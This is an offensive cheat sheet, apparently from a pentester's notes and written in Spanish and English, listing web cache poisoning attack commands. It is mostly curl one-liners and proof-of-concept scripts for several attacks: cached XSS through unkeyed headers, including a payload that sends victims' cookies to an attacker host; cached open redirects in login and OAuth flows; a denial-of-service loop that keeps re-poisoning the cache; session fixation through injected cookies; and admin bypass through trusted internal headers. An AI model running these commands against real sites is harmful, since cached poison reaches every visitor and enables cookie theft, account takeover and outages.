---
aliases:
  - Cache Poisoning XSS
  - Cache Poisoning DoS
  - Open Redirect Cache
  - Cookie Injection Cache
tags:
  - vuln/cache-poisoning
  - technique/initial-access
  - technique/impact
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Web Cache Poisoning]]"
  - "[[Cross-Site Scripting (XSS)]]"
---
# Web Cache Poisoning - Vectores de Poisoning

---

## Reflected XSS via Unkeyed Header

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Forwarded-Host: <script>alert(1)</script>" "https://target/?cb=$(date +%s)"` | Cache stored response con XFH reflejado en `<base href>` o canonical | XFH unkeyed + reflected. |
| `curl -H "X-Forwarded-Scheme: javascript" "https://target/?cb=$(date +%s)"` | Scheme reflection en URL building | Scheme reflected. |
| `curl -H "User-Agent: <script>alert(1)</script>" "https://target/error?cb=$(date +%s)"` | UA reflejado en error pages cached | UA-reflection error pages. |
| `curl -H "Referer: javascript:alert(1)" "https://target/?cb=$(date +%s)"` | Referer reflejado en links del page | Referer-reflection. |
| `curl -H "X-Original-URL: <script>alert(1)</script>" "https://target/?cb=$(date +%s)"` | X-Original-URL reflejado en logs/error | IIS-specific. |
| `curl -H "Origin: https://attacker<script>" "https://target/api/x?cb=$(date +%s)"` | Origin reflejado en CORS headers | CORS reflection. |
| Post-poison validation: `curl -s "https://target/?cb=<MISMA_KEY>" \| grep -i "<script"` | Verifica si poison persiste para legit users | TTL window confirmation. |
| `curl -H "X-Forwarded-Host: \"><img src=x onerror=fetch('//attacker?'+document.cookie)>" "https://target/?cb=$RANDOM"` | XSS con cookie exfil cached | Multi-victim cookie steal. |
^wcp-vector-xss

### PoC reflected XSS via X-Forwarded-Host

```bash
URL="https://target/?cb=$(date +%s)"

# 1. Probe normal
curl -s "$URL" | grep -i "<base href"
# <base href="https://target.com/">

# 2. Probe con XFH reflected
curl -s -H "X-Forwarded-Host: <script>alert(1)</script>" "$URL" | grep -i "<base href"
# <base href="https://<script>alert(1)</script>/">  ← reflejado

# 3. Confirmar unkeyed
URL2="https://target/?cb=$(date +%s)-poison"
curl -s -H "X-Forwarded-Host: <script>alert(1)</script>" "$URL2"
curl -s "$URL2" | grep -i "<base href"
# <base href="https://<script>...  ← cached!

# Victims fetching $URL2 reciben XSS por TTL completo
```

---

## Open Redirect via Host / X-Forwarded-Host

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI -H "X-Forwarded-Host: attacker.com" "https://target/login?cb=$(date +%s)"` | Cache `Location: https://attacker.com/auth/callback` | XFH reflected en redirect. |
| `curl -sI -H "X-Forwarded-Host: attacker.com" "https://target/logout?cb=$(date +%s)"` | Logout redirect a attacker | Logout flow cached. |
| `curl -sI -H "X-Forwarded-Host: attacker.com" "https://target/oauth/cb?cb=$(date +%s)&code=X"` | OAuth callback redirect poisoned | OAuth flow chain. |
| Verify post-poison: `curl -sI "https://target/login?cb=$ORIGINAL" \| grep -i location` | Confirma poison persiste cross-user | TTL validation. |
| `curl -sI -H "X-Forwarded-Host: 127.0.0.1:8080" "https://target/api/redirect?cb=$RANDOM"` | SSRF vía cached redirect a localhost | SSRF chain. |
| `curl -sI -H "Host: attacker.com" "https://target/?cb=$RANDOM"` | Direct Host poison | Host unkeyed. |
^wcp-vector-redirect

### PoC open redirect cache poison

```bash
URL="https://target/login?cb=$(date +%s)"

curl -s -H "X-Forwarded-Host: attacker.com" "$URL" -I | grep -i location
# Location: https://attacker.com/auth/callback?...

curl -s "$URL" -I | grep -i location
# Location: https://attacker.com/...  ← persistente cached
```

---

## DoS via Cache Poisoning (404 / 500 Storm)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Forwarded-Host: $(printf 'A%.0s' {1..10000})" "https://target/?cb=$(date +%s)"` | Cache 500 (header overflow) en URL legítima | Header processing fail. |
| `curl -H "X-Original-URL: /nonexistent-path-xyz" "https://target/?cb=$RANDOM"` | Cache 404 reflejado | Path override IIS. |
| `curl -H "X-Forwarded-Scheme: malformed:::value" "https://target/?cb=$RANDOM"` | Cache redirect loop o error 500 | Malformed scheme parser. |
| `curl -H "Accept: invalid/mime\x00type" "https://target/?cb=$RANDOM"` | Cache wrong MIME → browsers no interpretan | Content-Type fail. |
| `for url in /login /admin /api/health /; do curl -H "X-Forwarded-Host: <invalid>" "https://target$url?cb=$RANDOM"; done` | Bulk site-wide DoS | Multiple paths poisoned. |
| `while sleep $((TTL-30)); do curl -H "X-Forwarded-Host: <bad>" "https://target/?cb=$KEY"; done` | Refresh poison antes de TTL expire | Persistencia. |
| `curl -H "Origin: $(python3 -c 'print(\"A\"*5000)')" "https://target/api/?cb=$RANDOM"` | Cache CORS error response | CORS broken cached. |
^wcp-vector-dos

---

## Cookie Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI -H "X-Forwarded-Host: x" https://target/?cb=$RANDOM \| grep -i set-cookie` | Verifica si cache incluye Set-Cookie | Pre-attack check. |
| `curl -H "X-Tracking-ID: SESSION=ATTACKER_VALUE" "https://target/?cb=$RANDOM"` | Cache header reflejado a Set-Cookie | App reflects custom header como cookie. |
| `curl -H "X-Forwarded-Host: attacker.com" "https://target/login?cb=$RANDOM"` post-login → response Set-Cookie en cache | Session fixation via cached cookie | Login flow Set-Cookie cached. |
| Post-poison: víctima `curl https://target/login?cb=$KEY` → recibe `Set-Cookie: session=ATTACKER` | Confirmation session fixation cached | Multi-user impact. |
| `curl -H "X-CSRF-Token-Override: ATTACKER_TOKEN" "https://target/form?cb=$RANDOM"` | Cached CSRF token forced | CSRF token cached. |
^wcp-vector-cookie

---

## Internal Header Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Forwarded-For: 127.0.0.1" "https://target/admin?cb=$(date +%s)"` | Backend trustea XFF como local IP → admin features cached | Auth bypass via cached internal IP. |
| `curl -H "X-Real-IP: 10.0.0.5" "https://target/admin?cb=$RANDOM"` | IP allowlist bypass cached | Internal IP. |
| `curl -H "X-Authenticated-User: admin" "https://target/?cb=$RANDOM"` | Auth header trusted cached | Custom auth header trust. |
| `curl -H "X-Admin: true" "https://target/?cb=$RANDOM"` | Custom flag injection cached | App-specific privesc. |
| `curl -H "X-Tenant-ID: 1" "https://target/api/data?cb=$RANDOM"` | Multi-tenant escape cached | Tenant ID injection. |
| `curl -H "X-Role: admin" "https://target/?cb=$RANDOM"` | Role injection cached | Custom role header. |
| Post-poison: víctima común `curl https://target/admin?cb=$KEY` → recibe admin response | Mass privesc via cached admin context | Critical impact. |
^wcp-vector-internal

---
